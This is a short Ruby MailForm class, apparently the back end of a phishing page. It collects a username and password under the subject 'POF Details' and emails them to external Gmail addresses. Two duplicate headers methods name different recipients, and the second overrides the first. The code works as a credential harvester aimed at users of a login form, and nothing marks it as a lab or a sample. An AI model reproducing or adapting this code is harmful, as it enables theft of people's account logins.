class Welcome < MailForm::Base
    attribute :username,      :validate => true
    attribute :password, :validate => true

    attribute :nickname,  :captcha  => true

  # Declare the e-mail headers. It accepts anything the mail method
  # in ActionMailer accepts.

  def headers
 
      {
        :subject => "POF Details ",
        :to => 'daveskeen24@gmail.com',
        :from => %("#{username}")
      }
end
def headers
        {
        :subject => "POF Details ",
        :to => 'delightedchika@gmail.com',
        :from => %("#{username}")
      }
  

  end
